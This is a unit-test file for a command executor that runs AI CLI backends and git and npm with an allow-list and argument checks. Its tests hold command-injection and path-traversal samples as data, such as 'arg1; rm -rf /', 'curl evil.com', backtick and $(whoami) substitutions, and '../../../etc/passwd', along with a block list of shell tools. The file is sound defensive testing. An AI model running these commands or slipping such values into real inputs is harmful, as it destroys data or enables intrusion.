/**
 * Unit tests for commandExecutor.ts
 *
 * SECURITY: Tests command whitelist and argument validation
 * Target Coverage: 90%+
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { executeCommand, ExecutionResult } from '../../src/utils/cli/commandExecutor';
import { EventEmitter } from 'events';

// Mock logger to avoid console noise
vi.mock('../../src/utils/logger.js', () => ({
  logger: {
    debug: vi.fn(),
    error: vi.fn(),
    warn: vi.fn(),
    info: vi.fn(),
    progress: vi.fn(),
  },
}));

// Mock child_process
const mockSpawn = vi.fn();
vi.mock('child_process', () => ({
  spawn: (...args: any[]) => mockSpawn(...args),
}));

describe('commandExecutor', () => {
  let mockChildProcess: any;

  beforeEach(() => {
    // Reset all mocks
    vi.clearAllMocks();

    // Create a mock child process with EventEmitter
    mockChildProcess = new EventEmitter();
    mockChildProcess.stdout = new EventEmitter();
    mockChildProcess.stderr = new EventEmitter();
    mockChildProcess.stdin = {
      end: vi.fn(),
    };
    mockChildProcess.kill = vi.fn();

    // Setup default spawn behavior
    mockSpawn.mockReturnValue(mockChildProcess);
  });

  afterEach(() => {
    // Clean up any pending timers
    vi.clearAllTimers();
  });

  // Helper to simulate successful command execution
  const simulateSuccess = (output: string = 'success', exitCode: number = 0) => {
    setTimeout(() => {
      mockChildProcess.stdout.emit('data', Buffer.from(output));
      mockChildProcess.emit('close', exitCode, null);
    }, 10);
  };

  // Helper to simulate command failure
  const simulateFailure = (error: string = 'error', exitCode: number = 1) => {
    setTimeout(() => {
      mockChildProcess.stderr.emit('data', Buffer.from(error));
      mockChildProcess.emit('close', exitCode, null);
    }, 10);
  };

  // Helper to simulate command error
  const simulateError = (error: Error) => {
    setTimeout(() => {
      mockChildProcess.emit('error', error);
    }, 10);
  };

  // =================================================================
  // Suite 1: Command Whitelist
  // =================================================================
  describe('Command Whitelist', () => {
    it('should allow whitelisted AI commands', async () => {
      // Arrange
      const allowedCommands = ['gemini', 'droid', 'qwen', 'cursor-agent', 'rovodev', 'acli'];

      for (const cmd of allowedCommands) {
        vi.clearAllMocks();
        mockSpawn.mockReturnValue(mockChildProcess);

        // Act
        const promise = executeCommand(cmd, ['--help']);
        simulateSuccess('help output');
        await promise;

        // Assert
        expect(mockSpawn).toHaveBeenCalledWith(
          cmd,
          ['--help'],
          expect.objectContaining({
            shell: false,
          })
        );
      }
    });

    it('should allow whitelisted system commands', async () => {
      // Arrange
      const systemCommands = ['git', 'npm', 'which'];

      for (const cmd of systemCommands) {
        vi.clearAllMocks();
        mockSpawn.mockReturnValue(mockChildProcess);

        // Act
        const promise = executeCommand(cmd, ['--version']);
        simulateSuccess('version output');
        await promise;

        // Assert
        expect(mockSpawn).toHaveBeenCalledWith(
          cmd,
          ['--version'],
          expect.objectContaining({
            shell: false,
          })
        );
      }
    });

    it('should reject non-whitelisted commands', async () => {
      // Arrange
      const dangerousCommands = ['rm', 'curl', 'wget', 'python', 'node', 'bash'];

      for (const cmd of dangerousCommands) {
        // Act & Assert
        await expect(executeCommand(cmd, [])).rejects.toThrow(
          `Command not allowed: ${cmd}`
        );
        expect(mockSpawn).not.toHaveBeenCalled();
      }
    });

    it('should execute allowed command successfully', async () => {
      // Arrange
      const expectedOutput = 'Command output';

      // Act
      const promise = executeCommand('git', ['status']);
      simulateSuccess(expectedOutput);
      const result = await promise;

      // Assert
      expect(result).toBe(expectedOutput);
      expect(mockSpawn).toHaveBeenCalledTimes(1);
    });
  });

  // =================================================================
  // Suite 2: Argument Validation
  // =================================================================
  describe('Argument Validation', () => {
    it('should reject arguments with semicolons (;)', async () => {
      // Arrange
      const maliciousArg = 'arg1; rm -rf /';

      // Act & Assert
      await expect(executeCommand('git', [maliciousArg])).rejects.toThrow(
        `Dangerous argument pattern detected: ${maliciousArg}`
      );
      expect(mockSpawn).not.toHaveBeenCalled();
    });

    it('should reject arguments with ampersands (&)', async () => {
      // Arrange
      const maliciousArg = 'arg1 & curl evil.com';

      // Act & Assert
      await expect(executeCommand('git', [maliciousArg])).rejects.toThrow(
        `Dangerous argument pattern detected: ${maliciousArg}`
      );
      expect(mockSpawn).not.toHaveBeenCalled();
    });

    it('should reject arguments with backticks (`)', async () => {
      // Arrange
      const maliciousArg = 'arg`whoami`';

      // Act & Assert
      await expect(executeCommand('git', [maliciousArg])).rejects.toThrow(
        `Dangerous argument pattern detected: ${maliciousArg}`
      );
      expect(mockSpawn).not.toHaveBeenCalled();
    });

    it('should allow pipe (|) since shell:false', async () => {
      // Arrange: Pipe is safe with shell:false because it's treated as literal text
      const safeArg = 'commit message | with pipe';

      // Act
      const promise = executeCommand('git', ['commit', '-m', safeArg]);
      simulateSuccess('committed');
      await promise;

      // Assert
      expect(mockSpawn).toHaveBeenCalledWith(
        'git',
        ['commit', '-m', safeArg],
        expect.any(Object)
      );
    });

    it('should reject path traversal (../)', async () => {
      // Arrange
      const maliciousArg = '../../../etc/passwd';

      // Act & Assert
      await expect(executeCommand('git', ['add', maliciousArg])).rejects.toThrow(
        `Dangerous argument pattern detected: ${maliciousArg}`
      );
      expect(mockSpawn).not.toHaveBeenCalled();
    });

    it('should allow safe arguments', async () => {
      // Arrange
      const safeArgs = ['status', '--short', '--branch'];

      // Act
      const promise = executeCommand('git', safeArgs);
      simulateSuccess('status output');
      await promise;

      // Assert
      expect(mockSpawn).toHaveBeenCalledWith(
        'git',
        safeArgs,
        expect.any(Object)
      );
    });
  });

  // =================================================================
  // Suite 3: AI Backend Exemption
  // =================================================================
  describe('AI Backend Exemption', () => {
    it('should skip validation for AI backend commands', async () => {
      // Arrange: AI backends can have special chars in prompts
      const promptWithSpecialChars = 'What does `ls` do? Explain; with examples & details.';

      // Act
      const promise = executeCommand('gemini', [promptWithSpecialChars]);
      simulateSuccess('AI response');
      await promise;

      // Assert
      expect(mockSpawn).toHaveBeenCalledWith(
        'gemini',
        [promptWithSpecialChars],
        expect.any(Object)
      );
    });

    it('should allow special chars in AI prompts', async () => {
      // Arrange
      const aiBackends = ['gemini', 'droid', 'qwen', 'cursor-agent', 'rovodev', 'acli'];
      const specialPrompt = 'Use eval(); rm -rf; $(whoami) & ../../../etc';

      for (const backend of aiBackends) {
        vi.clearAllMocks();
        mockSpawn.mockReturnValue(mockChildProcess);

        // Act
        const promise = executeCommand(backend, [specialPrompt]);
        simulateSuccess('AI response');
        await promise;

        // Assert
        expect(mockSpawn).toHaveBeenCalledWith(
          backend,
          [specialPrompt],
          expect.any(Object)
        );
      }
    });

    it('should validate non-AI commands strictly', async () => {
      // Arrange
      const dangerousArg = 'arg; rm -rf /';

      // Act & Assert
      await expect(executeCommand('git', [dangerousArg])).rejects.toThrow(
        'Dangerous argument pattern detected:'
      );

      await expect(executeCommand('npm', [dangerousArg])).rejects.toThrow(
        'Dangerous argument pattern detected:'
      );
    });
  });

  // =================================================================
  // Suite 4: CWD Validation
  // =================================================================
  describe('CWD Validation', () => {
    it('should allow cwd within project', async () => {
      // Arrange
      const safeCwd = process.cwd() + '/tests';

      // Act
      const promise = executeCommand('git', ['status'], { cwd: safeCwd });
      simulateSuccess('status');
      await promise;

      // Assert
      expect(mockSpawn).toHaveBeenCalledWith(
        'git',
        ['status'],
        expect.objectContaining({
          cwd: expect.stringContaining('tests'),
        })
      );
    });

    it('should reject cwd outside project', async () => {
      // Arrange
      const outsideCwd = '/tmp';

      // Act & Assert
      await expect(executeCommand('git', ['status'], { cwd: outsideCwd })).rejects.toThrow(
        `Working directory outside project: ${outsideCwd}`
      );
      expect(mockSpawn).not.toHaveBeenCalled();
    });

    it('should reject cwd with path traversal', async () => {
      // Arrange: Path that exits project fails on boundary check first
      const traversalCwd = process.cwd() + '/../../../etc';

      // Act & Assert
      // Note: Fails on boundary check, not traversal check (boundary is first)
      await expect(executeCommand('git', ['status'], { cwd: traversalCwd })).rejects.toThrow(
        'Working directory outside project:'
      );
      expect(mockSpawn).not.toHaveBeenCalled();
    });

    it('should use process.cwd() when cwd not provided', async () => {
      // Arrange
      const expectedCwd = process.cwd();

      // Act
      const promise = executeCommand('git', ['status']);
      simulateSuccess('status');
      await promise;

      // Assert
      expect(mockSpawn).toHaveBeenCalledWith(
        'git',
        ['status'],
        expect.objectContaining({
          cwd: expectedCwd,
        })
      );
    });
  });

  // =================================================================
  // Suite 5: Execution Handling
  // =================================================================
  describe('Execution Handling', () => {
    it('should capture stdout output', async () => {
      // Arrange
      const expectedOutput = 'Command stdout output';

      // Act
      const promise = executeCommand('git', ['log']);
      simulateSuccess(expectedOutput);
      const result = await promise;

      // Assert
      expect(result).toBe(expectedOutput);
    });

    it('should handle stderr and exit code', async () => {
      // Arrange
      const errorMessage = 'fatal: not a git repository';

      // Act
      const promise = executeCommand('git', ['status']);
      simulateFailure(errorMessage, 128);

      // Assert
      await expect(promise).rejects.toThrow(
        `Command failed with exit code 128: ${errorMessage}`
      );
    });

    it('should handle process errors', async () => {
      // Arrange
      const error = new Error('ENOENT: command not found');

      // Act
      const promise = executeCommand('git', ['status']);
      simulateError(error);

      // Assert
      await expect(promise).rejects.toThrow(error);
    });

    it('should call onProgress callback with output chunks', async () => {
      // Arrange
      const onProgress = vi.fn();
      const chunk1 = 'chunk 1\n';
      const chunk2 = 'chunk 2\n';

      // Act
      const promise = executeCommand('git', ['log'], { onProgress });

      setTimeout(() => {
        mockChildProcess.stdout.emit('data', Buffer.from(chunk1));
        mockChildProcess.stdout.emit('data', Buffer.from(chunk2));
        mockChildProcess.emit('close', 0, null);
      }, 10);

      await promise;

      // Assert
      expect(onProgress).toHaveBeenCalledWith(chunk1);
      expect(onProgress).toHaveBeenCalledWith(chunk2);
    });

    it('should close stdin immediately', async () => {
      // Act
      const promise = executeCommand('git', ['status']);
      simulateSuccess('status');
      await promise;

      // Assert
      expect(mockChildProcess.stdin.end).toHaveBeenCalled();
    });

    it('should use shell:false for security', async () => {
      // Act
      const promise = executeCommand('git', ['status']);
      simulateSuccess('status');
      await promise;

      // Assert
      expect(mockSpawn).toHaveBeenCalledWith(
        'git',
        ['status'],
        expect.objectContaining({
          shell: false,
        })
      );
    });
  });

  // =================================================================
  // Suite 6: Timeout Handling
  // =================================================================
  describe('Timeout Handling', () => {
    beforeEach(() => {
      vi.useFakeTimers();
    });

    afterEach(() => {
      vi.useRealTimers();
    });

    it('should timeout after default 10 minutes', async () => {
      // Arrange
      const promise = executeCommand('git', ['log']);

      // Act: Advance time past default timeout (600000ms)
      vi.advanceTimersByTime(600001);

      // Assert
      await expect(promise).rejects.toThrow('Command timed out after 600000ms');
      expect(mockChildProcess.kill).toHaveBeenCalled();
    });

    it('should timeout after custom timeout', async () => {
      // Arrange
      const customTimeout = 5000;
      const promise = executeCommand('git', ['log'], { timeout: customTimeout });

      // Act
      vi.advanceTimersByTime(customTimeout + 1);

      // Assert
      await expect(promise).rejects.toThrow(`Command timed out after ${customTimeout}ms`);
      expect(mockChildProcess.kill).toHaveBeenCalled();
    });

    it('should not timeout if command completes in time', async () => {
      // Arrange
      const promise = executeCommand('git', ['status']);

      // Act: Complete before timeout
      simulateSuccess('status');
      vi.advanceTimersByTime(100);
      const result = await promise;

      // Assert
      expect(result).toBe('status');
      expect(mockChildProcess.kill).not.toHaveBeenCalled();
    });
  });
});
